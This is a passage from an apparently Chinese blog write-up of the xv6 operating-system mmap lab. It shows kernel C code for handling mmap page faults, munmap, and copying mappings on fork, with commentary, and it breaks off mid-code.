class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handle possible mmap page fault */</span></span><br><span class="line">    <span class="keyword">if</span>(mmap_handle_page_fault(r_stval(), r_scause()) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* mmap fails to handle page fault */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/mmap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Handle possible mmap page fault.</span></span><br><span class="line"><span class="comment"> * If exception address belongs to the process map mappings, and</span></span><br><span class="line"><span class="comment"> * cause fits the relative mapping protection, then kernel will</span></span><br><span class="line"><span class="comment"> * allocates the physical memory and map it with relative virtual</span></span><br><span class="line"><span class="comment"> * memory page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @va: virtual address triggers this page fault</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @scause: the page fault type</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return: return 0 if it successes to handle, or -1 if it fails</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmap_handle_page_fault</span><span class="params">(uint64 va, uint64 scause)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uvmarea</span> <span class="title">vm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">    <span class="type">int</span> idx = uvmarea_find(p-&gt;vm, p-&gt;nvm, va);</span><br><span class="line">    <span class="type">void</span> *pa;</span><br><span class="line">    uint offset, size;</span><br><span class="line">    <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check whether this va is in map mappings */</span></span><br><span class="line">    <span class="keyword">if</span>(idx == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    vm = p-&gt;vm[idx];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* kernel will treats page fault in page */</span></span><br><span class="line">    va = PGROUNDDOWN(va);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handle the page fault according to the scause type */</span></span><br><span class="line">    <span class="keyword">switch</span>(scause) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        <span class="comment">/* Load Page Fault */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check whether situation is matched */</span></span><br><span class="line">            <span class="keyword">if</span>((vm.prot &amp; PROT_READ) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* alloc the physical memory */</span></span><br><span class="line">            <span class="keyword">if</span>((pa = kalloc()) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* get the PTE created by mmap */</span></span><br><span class="line">            <span class="keyword">if</span>((pte = walk(p-&gt;pagetable, va, <span class="number">0</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">                kfree(pa);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mmap_assert_pte(pte);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* map the physical memory */</span></span><br><span class="line">            *pte |= PA2PTE(pa) | PTE_U;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* initial the page data */</span></span><br><span class="line">            <span class="built_in">memset</span>(pa, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* read the page data</span></span><br><span class="line"><span class="comment">             * kernel should store the initial offset</span></span><br><span class="line"><span class="comment">             * then set to the des offset</span></span><br><span class="line"><span class="comment">             * finally restore the initial offset</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            offset = vm.f-&gt;off;</span><br><span class="line">            size = vm.ed - va;</span><br><span class="line"></span><br><span class="line">            vm.f-&gt;off = vm.offset + (va - vm.st);</span><br><span class="line">            fileread(vm.f, va, size &lt;= PGSIZE ? size : PGSIZE);</span><br><span class="line">            vm.f-&gt;off = offset;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* none situation is matched*/</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当调用<strong>munmap()</strong>系统调用时，则查找该区间对应的元素，并根据相关情况释放资源，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/mmap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove npages of mappings starting from va, mapped from</span></span><br><span class="line"><span class="comment"> * mmap().</span></span><br><span class="line"><span class="comment"> * va must be page-aligned, the mappings may exist, and</span></span><br><span class="line"><span class="comment"> * perm may be 0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmap_uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va,</span></span><br><span class="line"><span class="params">                          uint64 npages)</span> &#123;</span><br><span class="line"></span><br><span class="line">    uint64 a;</span><br><span class="line">    <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    assert((va % PGSIZE) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(a = va; a &lt; va + npages*PGSIZE; a += PGSIZE) &#123;</span><br><span class="line"></span><br><span class="line">        pte = walk(pagetable, a, <span class="number">0</span>);</span><br><span class="line">        mmap_assert_pte(pte);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* PTEs in mmap mapping regions have only two situation</span></span><br><span class="line"><span class="comment">        * - *pte == (PTE_V | perm)</span></span><br><span class="line"><span class="comment">        * - *pte == (PTE_V | PTE_U | perm | pa)</span></span><br><span class="line"><span class="comment">        * So add sanity check to ensure ptes is valid</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((*pte &amp; PTE_U) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* Only in second situation does pte allocates physical page */</span></span><br><span class="line"></span><br><span class="line">            kfree((<span class="type">void</span>*)PTE2PA(*pte));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *pte = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unmap files or devices into memory</span></span><br><span class="line"><span class="comment"> * uint64 munmap(void *addr, uint length)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @addr: the begin address of the mmap mappings that kernel</span></span><br><span class="line"><span class="comment"> * wants to remove</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @length: the mmap mappings range that kernel wants to remove</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @return: munmap returns 0 if it successes,</span></span><br><span class="line"><span class="comment"> * or 0xffffffffffffffff if it fails.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * you can assume that *munmap will either unmap at the start,</span></span><br><span class="line"><span class="comment"> * or at the end, or the whole region (but not punch a hole</span></span><br><span class="line"><span class="comment"> * in the middle of a region).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uint64 <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, uint length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uvmarea</span> <span class="title">vm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">    uint64 address = (uint64)addr,</span><br><span class="line">           idx = uvmarea_find(p-&gt;vm, p-&gt;nvm, address);</span><br><span class="line">    uint offset;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Failed to find the area contains address */</span></span><br><span class="line">    <span class="keyword">if</span>(idx == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* do some sanity check for this area */</span></span><br><span class="line">    assert(idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; p-&gt;nvm);</span><br><span class="line">    assert(address &gt;= (vm = p-&gt;vm[idx]).st &amp;&amp;</span><br><span class="line">           length &lt;= (vm.ed - address));</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write back the modifications for MAP_SHARED */</span></span><br><span class="line">    <span class="keyword">if</span>((vm.prot &amp; PROT_WRITE) != <span class="number">0</span> &amp;&amp; vm.flags == MAP_SHARED) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* write the page data</span></span><br><span class="line"><span class="comment">         * kernel should store the initial offset</span></span><br><span class="line"><span class="comment">         * then set to the des offset</span></span><br><span class="line"><span class="comment">         * finally restore the initial offset</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        offset = vm.f-&gt;off;</span><br><span class="line">        vm.f-&gt;off = offset + (address - p-&gt;vm[idx].st);</span><br><span class="line">        filewrite(vm.f, address, length);</span><br><span class="line">        vm.f-&gt;off = offset;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* munmap the relative virtual memory, yet the problem</span></span><br><span class="line"><span class="comment">     * is that user may only munmap a portion of an</span></span><br><span class="line"><span class="comment">     * mmap-ed region, but user will either unmap at the start,</span></span><br><span class="line"><span class="comment">     * or at the end, or the whole region. kernel can deal with</span></span><br><span class="line"><span class="comment">     * these situations one by one</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vm.st == address &amp;&amp; (vm.ed - address) == length) &#123;</span><br><span class="line">    <span class="comment">/* unmap the whole region */</span></span><br><span class="line"></span><br><span class="line">        mmap_uvmunmap(p-&gt;pagetable, PGROUNDDOWN(vm.st),</span><br><span class="line">                 ((PGROUNDUP(vm.ed) - PGROUNDDOWN(vm.st))) / PGSIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* free the resource</span></span><br><span class="line"><span class="comment">         * - close the open file</span></span><br><span class="line"><span class="comment">         * - free the struct proc array&#x27;s element</span></span><br><span class="line"><span class="comment">         * - decrease the struct proc&#x27;s nvm field</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        fileclose(vm.f);</span><br><span class="line">        memmove(p-&gt;vm + idx, p-&gt;vm + idx + <span class="number">1</span>,</span><br><span class="line">                (p-&gt;nvm - idx - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> uvmarea));</span><br><span class="line">        --p-&gt;nvm;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(vm.st == address) &#123;</span><br><span class="line">    <span class="comment">/* unmap at the start */</span></span><br><span class="line"></span><br><span class="line">        mmap_uvmunmap(p-&gt;pagetable, PGROUNDDOWN(address),</span><br><span class="line">                 ((PGROUNDDOWN(address + length) - PGROUNDDOWN(vm.st))) / PGSIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* change the struct uvmarea&#x27;s st and offset field</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        p-&gt;vm[idx].st += length;</span><br><span class="line">        p-&gt;vm[idx].offset += length;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* unmap at the end */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* add sanity check to ensure it free the end region */</span></span><br><span class="line">        assert((vm.ed - address) == length);</span><br><span class="line"></span><br><span class="line">        mmap_uvmunmap(p-&gt;pagetable, PGROUNDUP(address),</span><br><span class="line">                 ((PGROUNDUP(vm.ed) - PGROUNDUP(address))) / PGSIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* change the struct uvmarea&#x27;s end field */</span></span><br><span class="line">        p-&gt;vm[idx].ed = address;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里特别需要注意的是，对于进程map的区域，其可能已经通过<strong>page fault</strong>分配了物理页，并添加了<strong>PTE_U</strong>权限；可能还没有分配物理页，并且未修改权限。因此在释放相关资源时，需要特别注意一下。</p><p>最后需要解决的，则是进程<strong>fork()</strong>或<strong>exit()</strong>后，进程map区域的变化。对于<strong>fork()</strong>，子进程应该拥有和父进程完全一致的map区域，这里将父进程相关的页表完全复制给子进程，并且将对应的虚拟页设置为只读，从而避免父、子进程的条件竞争(由于测试数据没有<strong>fork()</strong>后在写，所以并没有完全实现类似于<strong>COW</strong>机制)；对于<strong>exit()</strong>，则类似于处理<strong>page fault</strong>，需要注意有些虚拟页分配了物理页，并添加了<strong>PTE_U</strong>权限；可能还没有分配物理页，并且未修改权限<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/mmap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Deal with the mmap mapping regions</span></span><br><span class="line"><span class="comment"> * First, kernel needs to copy these mapping regions</span></span><br><span class="line"><span class="comment"> * and alter mapping meta data, such as increasing</span></span><br><span class="line"><span class="comment"> * physical memory reference.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Second, kernel needs to remap these mapping, to</span></span><br><span class="line"><span class="comment"> * remove PTE_W perm, like Copy-On-Write</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmap_fork</span><span class="params">(<span class="keyword">struct</span> proc *parent, <span class="keyword">struct</span> proc *child)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy mapping regions */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy the struct uvmarea arrays */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(child-&gt;vm, parent-&gt;vm, <span class="keyword">sizeof</span>(parent-&gt;vm));</span><br><span class="line">    <span class="comment">/* copy the nvm field number */</span></span><br><span class="line">    child-&gt;nvm = parent-&gt;nvm;</span><br><span class="line">    <span class="comment">/* copy the PTE and alter meta data */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; parent-&gt;nvm; ++i) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* copy the PTE */</span></span><br><span class="line">        <span class="keyword">if</span>(mmap_uvmcopy(parent-&gt;pagetable, child-&gt;pagetable, </span><br><span class="line">                        parent-&gt;vm[i].st,</span><br><span class="line">                        parent-&gt;vm[i].ed - parent-&gt;vm[i].st) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(--i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                mmap_uvmunmap(child-&gt;pagetable, PGROUNDDOWN(parent-&gt;vm[i].st),</span><br><span class="line">                              (PGROUNDUP(parent-&gt;vm[i].ed) -</span><br><span class="line">                               PGROUNDDOWN(parent-&gt;vm[i].st)) / PGSIZE);</span><br><span class="line">                fileclose(parent-&gt;vm[i].f);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* increase the file reference*/</span></span><br><span class="line">        filedup(parent-&gt;vm[i].f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remove all mmap mapping region PTE_W perm to avoid race-condition */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; parent-&gt;nvm; ++i) &#123;</span><br><span class="line"></span><br><span class="line">        mmap_uvmrdonly(parent-&gt;pagetable, child-&gt;pagetable,</span><br><span class="line">                       parent-&gt;vm[i].st,</span><br><span class="line">                       parent-&gt;vm[i].ed - parent-&gt;vm[i].st);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new process, copying the parent.</span></span><br><span class="line"><span class="comment">// Sets up child kernel stack to return as if from fork() system call.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, pid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span 